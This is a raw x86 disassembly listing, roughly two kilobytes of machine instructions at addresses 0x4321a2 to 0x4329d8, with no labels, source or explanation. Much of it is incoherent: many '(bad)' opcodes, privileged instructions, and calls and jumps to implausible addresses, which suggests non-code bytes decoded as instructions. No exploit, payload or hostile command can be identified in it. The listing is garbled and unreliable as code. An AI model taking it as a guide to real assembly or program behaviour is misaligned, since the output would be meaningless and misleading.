  4321a2:	or     BYTE PTR [ecx-0x7a87bb],cl
  4321a8:	jne    0x432162
  4321aa:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  4321b4:	mov    ecx,0xd74fb8
  4321b9:	add    cl,al
  4321bb:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4321c1:	or     DWORD PTR [ebx+0x558966e4],0x7e
  4321c8:	(bad)  
  4321c9:	(bad)  
  4321ca:	std    
  4321cb:	mov    eax,0x8c2789
  4321d0:	ret    0x6689
  4321d3:	adc    BYTE PTR [ebp+0x40],0x8d
  4321d7:	add    bh,ah
  4321d9:	mov    WORD PTR [ebp-0x70],ax
  4321dd:	(bad)  
  4321de:	ret    0x6605
  4321e1:	or     BYTE PTR [ebp-0x77],dl
  4321e4:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  4321eb:	loop   0x432176
  4321ed:	(bad)  
  4321ee:	xchg   esi,eax
  4321ef:	aam    0xcf
  4321f1:	out    dx,al
  4321f2:	mov    DWORD PTR [esi-0x68],edi
  4321f5:	inc    ebp
  4321f6:	dec    edx
  4321f7:	pop    ecx
  4321f8:	mov    edx,DWORD PTR [eax]
  4321fa:	repnz push bp
  4321fd:	or     BYTE PTR [ebx+0x5510663a],0x49
  432204:	(bad)  
  432205:	repnz cmp eax,0xa0898945
  43220b:	mov    ah,0x89
  43220d:	jmp    DWORD PTR [edx+0x66b0418d]
  432213:	inc    DWORD PTR [ebp+0x50]
  432216:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43221a:	mov    DWORD PTR [eax],ecx
  43221c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43221d:	pop    es
  43221e:	inc    ecx
  43221f:	(bad)  
  432220:	cwd    
  432222:	inc    ebp
  432223:	xor    ah,BYTE PTR [esi+0x3]
  432226:	dec    ebp
  432227:	push   eax
  432228:	inc    bp
  43222a:	jge    0x4321af
  43222c:	mov    esp,DWORD PTR [esi-0x18]
  43222f:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  432235:	add    DWORD PTR [ebx],esi
  432237:	add    BYTE PTR [ebx],al
  432239:	test   DWORD PTR [ebx],esi
  43223b:	(bad)  
  43223c:	inc    WORD PTR [ebp+0x0]
  432240:	mov    eax,DWORD PTR [eax]
  432242:	call   0x8898d977
  432247:	mov    esi,eax
  432249:	clc    
  43224a:	ret    
  43224b:	rol    cl,0xa
  43224e:	mov    DWORD PTR ds:0x7c0ec88,esi
  432254:	mov    edx,edi
  432256:	pushf  
  432257:	pop    es
  432258:	jmp    DWORD PTR [edx+0x66]
  43225b:	add    BYTE PTR [ebp-0x990175],al
  432261:	inc    ebp
  432262:	test   DWORD PTR [ebx-0x2f00ea02],eax
  432268:	push   ebp
  432269:	mov    edi,eax
  43226b:	mov    dh,BYTE PTR [eax+0x266ff51]
  432271:	push   ebp
  432272:	add    BYTE PTR [ebx-0x764b0777],al
  432278:	dec    DWORD PTR [esi+0x661851e8]
  43227e:	add    BYTE PTR [ebp-0x7b],dl
  432281:	cmp    esi,0x3
  432284:	dec    DWORD PTR [ecx+0x51fe9285]
  43228a:	jmp    DWORD PTR [esi-0x75]
  43228d:	push   ebp
  43228e:	hlt    
  43228f:	data16 (bad) 
  432291:	dec    ebp
  432292:	ret    
  432293:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432299:	lea    edx,[eax-0x1]
  43229c:	jne    0x43226f
  43229e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4322a4:	dec    BYTE PTR [ecx+0x51559eff]
  4322aa:	mov    DWORD PTR [esi-0x4c],esp
  4322ad:	push   ebp
  4322ae:	jmp    DWORD PTR [esi-0x18]
  4322b1:	inc    ebp
  4322b2:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4322b8:	(bad)  
  4322b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4322ba:	inc    eax
  4322bc:	test   DWORD PTR [esi-0x2],esp
  4322bf:	inc    ebp
  4322c0:	dec    DWORD PTR [ebp-0x760bde75]
  4322c6:	(bad)  
  4322c7:	test   al,0xc3
  4322c9:	mov    DWORD PTR [ebp-0x769b56],ecx
  4322cf:	lods   al,BYTE PTR ds:[esi]
  4322d0:	push   eax
  4322d1:	inc    ebp
  4322d2:	jne    0x4322e3
  4322d4:	dec    DWORD PTR [ebp+0x8]
  4322d7:	mov    eax,DWORD PTR [edi]
  4322d9:	sbb    al,0x0
  4322db:	(bad)  
  4322dc:	mov    eax,0xc14fc3
  4322e1:	mov    DWORD PTR [eax-0x64],edi
  4322e4:	inc    bp
  4322e6:	test   DWORD PTR [edi],ecx
  4322e8:	dec    DWORD PTR [ebp-0x1]
  4322eb:	xor    eax,edi
  4322ed:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4322f3:	inc    ebp
  4322f4:	xor    DWORD PTR [ebx],0x43
  4322f7:	mov    WORD PTR [ebp-0x1bc],ax
  4322fe:	lea    ecx,[ecx-0x7677fe]
  432304:	inc    esi
  432305:	(bad)  
  432306:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43230d:	pushf  
  43230e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432315:	add    bh,bh
  432317:	add    BYTE PTR [edi],cl
  432319:	test   DWORD PTR [eax],eax
  43231b:	(bad)  
  43231c:	dec    WORD PTR [ebp-0xff002d]
  432323:	mov    DWORD PTR [eax-0x48],esi
  432326:	add    bh,bh
  432328:	lea    cx,[ebp-0x50]
  43232f:	push   eax
  432330:	rol    BYTE PTR [ebp+0x0],1
  432333:	xor    esp,DWORD PTR [esi+0x3]
  432336:	lea    edx,[eax-0x1]
  432339:	test   edi,edi
  43233b:	dec    DWORD PTR [ebp-0x1]
  43233e:	mov    edi,edi
  432340:	dec    eax
  432341:	clc    
  432342:	call   DWORD PTR [ebp-0x73]
  432345:	lea    esi,[eax+0x51ffff88]
  43234b:	lea    ecx,[ebp-0x78]
  43234e:	test   WORD PTR [ebp-0x2],ax
  432355:	popf   
  432356:	push   ecx
  432357:	add    BYTE PTR [ecx-0x77],dl
  43235a:	xor    edi,DWORD PTR [eax-0x724a007d]
  432360:	cdq    
  432361:	mov    al,0x32
  432363:	inc    DWORD PTR [ebx]
  432365:	push   eax
  432366:	push   ecx
  432367:	inc    ebp
  432368:	shl    BYTE PTR [ebx],1
  43236a:	lea    eax,[ebx]
  43236c:	call   DWORD PTR [eax-0x1]
  43236f:	test   DWORD PTR [ebx],esi
  432371:	inc    DWORD PTR [eax-0x1]
  432374:	(bad)  
  432375:	(bad)  
  432376:	(bad)  
  432377:	clc    
  432378:	call   DWORD PTR [ebp+0x50]
  43237b:	jmp    0xcc24f5
  432380:	inc    esp
  432381:	jae    0x432382
  432383:	add    BYTE PTR [ecx-0x384f73],cl
  432389:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43238f:	mov    eax,DWORD PTR [ecx]
  432391:	data16 add BYTE PTR [ebp-0xb50077],al
  432398:	inc    eax
  43239a:	lea    esp,[esi+0x1c]
  43239d:	test   DWORD PTR [ecx-0xb301],ecx
  4323a3:	inc    edi
  4323a4:	(bad)  
  4323a5:	dec    si
  4323a7:	test   edi,edi
  4323a9:	push   DWORD PTR [ecx]
  4323ab:	(bad)  
  4323ac:	jnp    0x4323fd
  4323ae:	(bad)  
  4323af:	mov    edx,DWORD PTR [edx-0x7d]
  4323b2:	(bad)  
  4323b3:	mov    ebx,0x563a8935
  4323b8:	(bad)  
  4323b9:	call   FWORD PTR [esi-0x47]
  4323bc:	inc    DWORD PTR ds:0x893000e2
  4323c2:	(bad)  
  4323c3:	pop    eax
  4323c4:	mov    ah,0xff
  4323c6:	(bad)  
  4323c7:	mov    ecx,0x5745
  4323cc:	dec    DWORD PTR [ecx-0xf7a501]
  4323d2:	(bad)  
  4323d3:	mov    ecx,0x456108
  4323d8:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4323de:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4323e4:	inc    BYTE PTR gs:[eax]
  4323e7:	inc    DWORD PTR [ebp-0x73]
  4323ea:	ss (bad) 
  4323ec:	pushf  
  4323ed:	inc    edi
  4323ef:	mov    ebx,eax
  4323f1:	hlt    
  4323f2:	test   DWORD PTR [ecx-0xbab708],ecx
  4323f8:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  4323fe:	lock into 
  432400:	test   eax,eax
  432402:	clc    
  432403:	mov    ebx,0x367245
  432408:	lahf   
  432409:	retf   
  43240a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432410:	add    edi,edi
  432412:	add    BYTE PTR [ecx+0x45],dl
  432415:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43241c:	mov    edx,DWORD PTR [ecx-0x74]
  43241f:	inc    DWORD PTR [eax]
  432421:	cld    
  432422:	mov    eax,DWORD PTR [ebp-0x6f0175]
  432428:	add    BYTE PTR [ebp-0x1b0177],al
  43242e:	jge    0x432475
  432430:	test   DWORD PTR [ebx+0xff9875],ecx
  432436:	sbb    BYTE PTR [esi+0x55],ah
  432439:	xchg   ebp,eax
  43243a:	call   0x431f3e
  43243f:	push   edi
  432440:	inc    ebp
  432441:	mov    dx,WORD PTR [ebp-0xfc0075]
  432448:	cmp    al,0x85
  43244a:	ud0    eax,DWORD PTR [ebp-0x1]
  43244e:	test   DWORD PTR [edi+0x74],ecx
  432451:	dec    edi
  432452:	inc    DWORD PTR [ebp-0xf70004]
  432458:	dec    DWORD PTR [edi-0x75]
  43245b:	dec    edi
  43245c:	cld    
  43245d:	test   DWORD PTR [eax+0xff01ff],eax
  432463:	icebp  
  432464:	add    BYTE PTR [edi-0x3a],cl
  432467:	test   ebx,eax
  432469:	inc    BYTE PTR [ebp-0x1]
  43246c:	jne    0x43246e
  43246e:	mov    eax,DWORD PTR [eax]
  432470:	cld    
  432471:	xor    BYTE PTR [ecx+0x500155],cl
  432477:	push   ebp
  432478:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43247e:	add    BYTE PTR [ebp+0x35e90f50],al
  432484:	add    al,BYTE PTR [eax]
  432486:	add    BYTE PTR [ebx-0x38fe4f80],al
  43248c:	add    ah,ch
  43248e:	or     BYTE PTR [ebp+0x4501f845],dh
  432494:	jmp    0xdf278f
  432499:	(bad)  
  43249a:	nop    ecx
  43249d:	test   DWORD PTR [ebp+0x4502f8],eax
  4324a3:	cmp    BYTE PTR [ebp-0x64],cl
  4324a6:	mov    eax,edi
  4324a8:	mov    ebx,DWORD PTR [eax+edx*2]
  4324ab:	add    eax,0x45fef885
  4324b0:	dec    DWORD PTR [ebx+0x339445]
  4324b6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4324bc:	dec    DWORD PTR [ebx-0x460f0375]
  4324c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4324c3:	add    esi,edi
  4324c5:	add    bh,bh
  4324c7:	rdpmc  
  4324c9:	add    BYTE PTR [ebx],0x1
  4324cc:	mov    DWORD PTR [eax],eax
  4324ce:	add    al,0x45
  4324d0:	dec    DWORD PTR [ecx-0x360b3373]
  4324d6:	dec    DWORD PTR [esi]
  4324d8:	push   eax
  4324d9:	jne    0x432520
  4324db:	mov    esi,DWORD PTR [ebx]
  4324dd:	cld    
  4324de:	add    ebp,ebx
  4324e0:	push   eax
  4324e1:	inc    DWORD PTR [ebp-0x75]
  4324e4:	add    eax,0x800e4
  4324e9:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4324ef:	mov    DWORD PTR [ecx],eax
  4324f1:	sbb    al,0x0
  4324f3:	leave  
  4324f4:	test   DWORD PTR [edi-0x2],eax
  4324f7:	jne    0x4324f8
  4324f9:	call   0xff440ffe
  4324fe:	xor    BYTE PTR [ebp+0x4d],al
  432501:	mov    edi,edi
  432503:	enter  0x8,0x4d
  432507:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43250d:	mov    eax,DWORD PTR [eax]
  43250f:	cld    
  432510:	add    DWORD PTR [ecx],ebx
  432512:	inc    ebp
  432513:	dec    ebp
  432514:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43251a:	inc    eax
  43251b:	dec    DWORD PTR [ecx-0x270375]
  432521:	add    BYTE PTR [ebx-0x39d72701],cl
  432527:	xchg   ecx,eax
  432528:	ret    
  432529:	add    BYTE PTR [ebp-0x830075],al
  43252f:	add    BYTE PTR [ebp-0x75],al
  432532:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  432538:	lea    edi,[edi-0xc]
  43253b:	add    bh,bh
  43253d:	mov    edx,DWORD PTR [eax-0x7b]
  432540:	inc    ebp
  432541:	rdpmc  
  432543:	jne    0x432548
  432545:	add    BYTE PTR [eax-0x75],dl
  432548:	inc    ebp
  432549:	clc    
  43254a:	add    eax,0x400009
  43254f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  432555:	mov    eax,DWORD PTR [ecx]
  432557:	in     al,dx
  432558:	add    dh,al
  43255a:	test   ebx,eax
  43255c:	inc    BYTE PTR [ebp-0xff0001]
  432562:	add    BYTE PTR [ebp-0x43],al
  432565:	cmp    esi,0xfffffff8
  432568:	(bad)  
  432569:	push   DWORD PTR [eax]
  43256b:	add    BYTE PTR [ebp-0x3a],dl
  43256e:	test   ebx,eax
  432570:	je     0x4324f7
  432572:	mov    edi,edi
  432574:	sbb    al,0xff
  432576:	test   DWORD PTR gs:[eax],eax
  432579:	(bad)  
  43257a:	js     0x43257b
  43257c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432582:	sub    eax,ebx
  432584:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43258a:	add    eax,DWORD PTR [eax]
  43258c:	dec    ebp
  43258d:	push   eax
  43258e:	mov    al,BYTE PTR [ebp+0x1]
  432591:	mov    eax,DWORD PTR [ebp-0x68]
  432594:	mov    eax,DWORD PTR [eax]
  432596:	sbb    bh,al
  432598:	or     ah,dh
  43259a:	dec    ebp
  43259b:	inc    DWORD PTR [eax+0x4]
  43259e:	push   ecx
  43259f:	add    BYTE PTR [edx-0x1],dh
  4325a2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4325a8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4325b2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4325b8:	push   ecx
  4325b9:	cmp    BYTE PTR [ebx],al
  4325bb:	inc    ebp
  4325bc:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4325c2:	(bad)  
  4325c3:	(bad)  
  4325c4:	in     al,0xff
  4325c6:	add    BYTE PTR [ebp+0x0],al
  4325c9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4325cf:	add    al,bh
  4325d1:	(bad)  
  4325d2:	jmp    0x8d85:0x74b0558d
  4325d9:	dec    DWORD PTR [eax]
  4325db:	call   DWORD PTR [ebp-0x7b]
  4325de:	mov    edi,esi
  4325e0:	lock call DWORD PTR [ebp-0x75]
  4325e4:	mov    esi,esp
  4325e6:	mov    ah,0xc6
  4325e8:	mov    bh,0xc3
  4325ea:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4325f0:	add    DWORD PTR [eax],0x450050ff
  4325f6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4325fc:	inc    edi
  4325fe:	push   esp
  432600:	jmp    0xcd00:0x670481ff
  432607:	mov    DWORD PTR [ebx],esi
  432609:	clc    
  43260a:	cmp    edi,0xff9cff3b
  432610:	jne    0x43261a
  432612:	mov    eax,eax
  432614:	add    esi,DWORD PTR [eax]
  432616:	int3   
  432617:	inc    ebp
  432618:	cmp    al,0x83
  43261a:	add    BYTE PTR [eax],bl
  43261c:	adc    DWORD PTR [ebx+0x768b5055],eax
  432622:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  432628:	mov    edi,eax
  43262a:	cmp    BYTE PTR [ebp+0x45],cl
  43262d:	jmp    0x4325ba
  43262f:	mov    ebx,DWORD PTR [esp+ebp*8]
  432632:	inc    ebp
  432633:	or     al,0x2
  432635:	dec    DWORD PTR [ebp+0x18]
  432638:	jne    0x43268f
  43263a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  432640:	mov    edi,DWORD PTR [ebx]
  432642:	in     al,0x50
  432644:	xchg   ecx,eax
  432645:	jmp    0x343754a
  43264a:	adc    al,0x8b
  43264c:	inc    ebp
  43264d:	mov    al,ds:0x8b04008b
  432652:	push   ebp
  432653:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  432659:	push   ebp
  43265a:	test   DWORD PTR [ebx-0x2800d701],ecx
  432660:	inc    ebp
  432661:	dec    ebp
  432662:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  432668:	mov    DWORD PTR [eax],0xe9ff00f4
  43266e:	add    al,0x0
  432670:	add    BYTE PTR [eax],al
  432672:	mov    eax,edx
  432674:	push   eax
  432675:	rol    DWORD PTR [ebp-0xf0177],1
  43267b:	bound  eax,QWORD PTR [ebp+0x50]
  43267e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432684:	add    BYTE PTR [ecx+0x558df0ff],cl
  43268a:	mov    al,0xf
  43268c:	test   DWORD PTR [edx],edx
  43268e:	call   DWORD PTR [ebp-0x7a0001]
  432694:	(bad)  
  432695:	loop   0x432696
  432697:	jnp    0xc6991a9d
  43269d:	mov    eax,ebx
  43269f:	cmp    al,0x8b
  4326a1:	(bad)  
  4326a2:	cld    
  4326a3:	shr    esi,0xc
  4326a6:	add    dl,al
  4326a8:	push   eax
  4326a9:	lea    eax,[ebp-0x1]
  4326ac:	mov    edx,esi
  4326ae:	cwde   
  4326af:	cli    
  4326b0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4326b6:	or     BYTE PTR [eax],cl
  4326b8:	inc    ebp
  4326b9:	dec    ebp
  4326ba:	inc    DWORD PTR [ebx+0x74803914]
  4326c0:	add    DWORD PTR [ebx+0x451800],ecx
  4326c6:	call   DWORD PTR [eax+edx*1]
  4326c9:	add    ecx,DWORD PTR [ebp-0x34]
  4326cc:	push   edi
  4326cd:	adc    al,0x8
  4326cf:	mov    edx,DWORD PTR [ebp-0x14]
  4326d2:	mov    ecx,DWORD PTR [ebp+0x18]
  4326d5:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4326d9:	inc    DWORD PTR [eax+esi*8]
  4326dc:	inc    ebp
  4326dd:	stos   BYTE PTR es:[edi],al
  4326de:	mov    edx,DWORD PTR [ebp-0x4]
  4326e1:	add    DWORD PTR [ebp-0x1c],eax
  4326e4:	mov    edx,DWORD PTR [ebp-0x70]
  4326e7:	cmp    eax,DWORD PTR [eax]
  4326e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4326ea:	mov    eax,DWORD PTR [eax]
  4326ec:	cld    
  4326ed:	jae    0x43266f
  4326ef:	add    eax,DWORD PTR [ecx]
  4326f1:	clc    
  4326f2:	add    BYTE PTR [eax+0x30],dl
  4326f5:	mov    DWORD PTR [ecx],esi
  4326f7:	clc    
  4326f8:	pop    ds
  4326f9:	inc    ebp
  4326fa:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432700:	(bad)  
  432701:	push   DWORD PTR [edi]
  432703:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432709:	(bad)  
  43270a:	jae    0x43270b
  43270c:	mov    eax,DWORD PTR [ebp-0x740175]
  432712:	sub    eax,DWORD PTR [eax]
  432714:	add    eax,DWORD PTR [eax]
  432716:	mov    DWORD PTR [ecx+0x5f],eax
  432719:	mov    DWORD PTR [ebx-0x4],ebx
  43271c:	ret    0xff
  43271f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  432725:	ret    
  432726:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43272c:	add    BYTE PTR [ebp-0x7d],al
  43272f:	mov    DWORD PTR [eax],eax
  432731:	add    al,0x84
  432733:	inc    DWORD PTR [ecx]
  432735:	lea    eax,[eax]
  432737:	hlt    
  432738:	sar    bh,cl
  43273a:	test   BYTE PTR [eax+0x1],dl
  43273d:	inc    ebp
  43273e:	add    BYTE PTR [ebx],dh
  432740:	test   BYTE PTR [ebx],0x84
  432743:	push   eax
  432744:	add    BYTE PTR [ebp+0x0],al
  432747:	add    eax,0x86
  43274c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  432752:	add    BYTE PTR [ecx],al
  432754:	add    BYTE PTR [eax],al
  432756:	mov    esi,0x550030
  43275b:	mov    ecx,DWORD PTR [edi]
  43275d:	cld    
  43275e:	fidiv  DWORD PTR [ebp+0x0]
  432761:	mov    edi,DWORD PTR [ecx]
  432763:	xor    BYTE PTR [eax+eax*1],0x84
  432767:	add    eax,DWORD PTR [eax]
  432769:	sbb    BYTE PTR [eax],al
  43276b:	jne    0x43271e
  43276d:	mov    eax,DWORD PTR [ecx]
  43276f:	sbb    BYTE PTR [eax],al
  432771:	mov    DWORD PTR [ebp-0x1],esp
  432774:	add    BYTE PTR [eax+0x30e45ca],bh
  43277a:	ret    0xb7fc
  43277d:	dec    ebp
  43277e:	or     al,0x89
  432780:	dec    ebp
  432781:	cld    
  432782:	cmovne ecx,DWORD PTR [eax-0x75]
  432786:	add    edi,esp
  432788:	seto   BYTE PTR [esi-0x72ffffff]
  43278f:	inc    ebp
  432790:	adc    al,0x8b
  432792:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432799:	cmp    DWORD PTR [edi+0x72],edx
  43279c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4327a2:	gs cmp al,0x0
  4327a5:	je     0x43277d
  4327a7:	push   eax
  4327a8:	sar    BYTE PTR [eax],1
  4327aa:	mov    bh,0x3e
  4327ac:	push   cs
  4327ad:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4327b3:	add    DWORD PTR [ecx+0x12],ebp
  4327b6:	dec    edx
  4327b7:	(bad)  
  4327b8:	mov    eax,edx
  4327ba:	in     al,dx
  4327bb:	adc    DWORD PTR [ecx],esi
  4327bd:	pop    esi
  4327be:	inc    ecx
  4327bf:	leave  
  4327c0:	or     DWORD PTR [eax],ebx
  4327c2:	gs push ebp
  4327c4:	add    ah,ch
  4327c6:	into   
  4327c7:	in     al,dx
  4327c8:	enter  0xb756,0xf0
  4327cc:	push   cs
  4327cd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4327d7:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4327dd:	jnp    0x7443ace5
  4327e3:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4327e9:	add    BYTE PTR [edi],cl
  4327eb:	mov    edi,DWORD PTR [ecx-0x78]
  4327ee:	ltr    WORD PTR [ecx-0x7b]
  4327f2:	dec    DWORD PTR [edi]
  4327f4:	clc    
  4327f5:	out    0x45,eax
  4327f7:	add    BYTE PTR [eax],cl
  4327f9:	cmp    ebx,0xffffff8c
  4327fc:	jge    0x4327fe
  4327fe:	jb     0x432810
  432800:	je     0x522880
  432806:	pop    edx
  432807:	push   esi
  432808:	mov    ecx,DWORD PTR [edi]
  43280a:	in     al,dx
  43280b:	rol    DWORD PTR [ebp+0x0],1
  43280e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432815:	cmp    DWORD PTR [ecx],0xfffffff0
  432818:	hlt    
  432819:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43281f:	(bad)  
  432821:	push   eax
  432822:	jns    0xb8430ca0
  432828:	lock push cs
  43282a:	ror    edx,0x3
  43282d:	test   BYTE PTR [ecx+0x5500e800],cl
  432833:	dec    eax
  432834:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  432838:	(bad)  
  432839:	mov    esi,0x7f33ff5f
  43283e:	inc    eax
  43283f:	test   DWORD PTR [edx],eax
  432841:	je     0x432803
  432843:	mov    ecx,ecx
  432845:	adc    DWORD PTR [ebp-0xc],0xffffffec
  432849:	and    eax,DWORD PTR [eax+0xf0103]
  43284f:	jp     0x43283d
  432851:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  432855:	add    edx,DWORD PTR [edi+0x74]
  432858:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43285e:	add    BYTE PTR [ebp-0x74c48bbb],al
  432864:	je     0x4327e9
  432866:	cmp    eax,edi
  432868:	js     0x43288d
  43286a:	add    eax,0xeb0fc003
  43286f:	jns    0x4327fc
  432871:	vmread DWORD PTR [ecx+0x45],ebx
  432875:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  43287b:	adc    al,0x8b
  43287d:	jge    0x432893
  43287f:	mov    edi,DWORD PTR [eax-0x4]
  432882:	add    edi,DWORD PTR [edi]
  432884:	or     bh,bh
  432886:	push   ebp
  432887:	push   es
  432888:	mov    DWORD PTR [ebp-0x4],ebx
  43288b:	add    edi,esi
  43288d:	pop    es
  43288e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432894:	mov    DWORD PTR [esp+esi*8],ecx
  432897:	inc    ebp
  432898:	pop    ebp
  432899:	xor    DWORD PTR [esi-0x4],0x3b
  43289d:	add    edx,DWORD PTR [ecx+edi*1]
  4328a0:	push   es
  4328a1:	clc    
  4328a2:	mov    bh,0xdb
  4328a4:	jp     0x43285d
  4328a6:	add    cl,BYTE PTR [esi]
  4328a8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4328ae:	test   edi,edi
  4328b0:	je     0x4328a6
  4328b2:	mov    eax,ecx
  4328b4:	or     BYTE PTR [ebx],al
  4328b6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4328bc:	jbe    0x432930
  4328be:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4328c4:	add    ecx,DWORD PTR [esi]
  4328c6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4328cc:	add    eax,DWORD PTR [ebx-0x287af783]
  4328d2:	je     0x432921
  4328d4:	mov    DWORD PTR [ecx],edi
  4328d6:	mov    esi,eax
  4328d8:	hlt    
  4328d9:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4328e0:	jb     0x4328a2
  4328e2:	jmp    0x4328cf
  4328e4:	xor    esi,DWORD PTR [ebx]
  4328e6:	pop    edi
  4328e7:	pop    esi
  4328e8:	pop    ebx
  4328e9:	ret    
  4328ea:	ret    0x8b
  4328ed:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4328f3:	xor    DWORD PTR [esi],0xc
  4328f6:	pushf  
  4328f7:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4328fd:	(bad)  
  4328ff:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432906:	dec    ebp
  432907:	ret    
  432908:	mov    edi,DWORD PTR [esi-0x4]
  43290b:	pop    eax
  43290c:	dec    ebp
  43290d:	jne    0x43289a
  43290f:	xor    edi,esp
  432911:	inc    eax
  432912:	dec    ebp
  432913:	jbe    0x432968
  432915:	inc    eax
  432916:	pop    ebp
  432917:	add    edx,DWORD PTR [esi+0x8]
  43291a:	push   ecx
  43291b:	dec    eax
  43291c:	push   ecx
  43291d:	mov    eax,edi
  43291f:	and    al,0xf0
  432921:	jo     0x43290e
  432923:	mov    eax,DWORD PTR [ebx]
  432925:	sbb    BYTE PTR [ebp+0x4d],cl
  432928:	mov    eax,DWORD PTR [ebx]
  43292a:	nop
  43292b:	or     BYTE PTR [eax],al
  43292d:	jne    0x432986
  43292f:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432935:	cld    
  432936:	xor    edi,edi
  432938:	add    edi,DWORD PTR [ebp+0x3]
  43293b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432941:	js     0x4328c7
  432943:	jae    0x432947
  432945:	(bad)  
  432947:	xor    al,0x5d
  432949:	jmp    0x4328d6
  43294b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432952:	fdecstp 
  432954:	test   BYTE PTR [edi],ah
  432956:	add    bh,BYTE PTR [ebp+0x0]
  432959:	add    ebx,DWORD PTR [ebp-0x77]
  43295c:	mov    edi,eax
  43295e:	cmp    al,0x0
  432961:	adc    dh,BYTE PTR [ebx]
  432963:	jge    0x432968
  432965:	mov    edi,DWORD PTR [ebx]
  432967:	jl     0x432978
  432969:	clc    
  43296a:	dec    edi
  43296b:	jge    0x43296d
  43296d:	mov    eax,DWORD PTR [ebx]
  43296f:	jb     0x432979
  432971:	mov    ecx,DWORD PTR [ebp-0x8]
  432974:	mov    edi,edi
  432976:	xor    edx,DWORD PTR [eax]
  432978:	add    edi,DWORD PTR [ebx]
  43297a:	mov    DWORD PTR [ebp-0x10],edi
  43297d:	inc    edi
  43297e:	pop    ebp
  43297f:	jge    0x4329bc
  432981:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432985:	mov    edx,0xc05d87f0
  43298a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  43298e:	fimul  WORD PTR [eax]
  432990:	fist   WORD PTR [ebp+0x1c]
  432993:	in     al,dx
  432994:	jne    0x432982
  432996:	mov    edi,DWORD PTR [edx-0x7a27a10]
  43299c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  4329a0:	fdivp  st(0),st
  4329a2:	fild   WORD PTR [ebp+0x4510f85c]
  4329a8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  4329ae:	inc    ebp
  4329af:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  4329b5:	mov    ebp,DWORD PTR [ebx-0x4]
  4329b8:	adc    al,0x8b
  4329ba:	rcl    DWORD PTR [eax],0x48
  4329bd:	mov    esi,0x7080803
  4329c2:	fiadd  WORD PTR [ebp+0x4d]
  4329c5:	mov    WORD PTR [ebx+0x558bfc52],cs
  4329cb:	cld    
  4329cc:	xor    ebx,DWORD PTR [ebx+0x330103]
  4329d2:	mov    DWORD PTR [edi+0x872dc],edi
  4329d8:	xlat   BYTE PTR ds:[ebx]
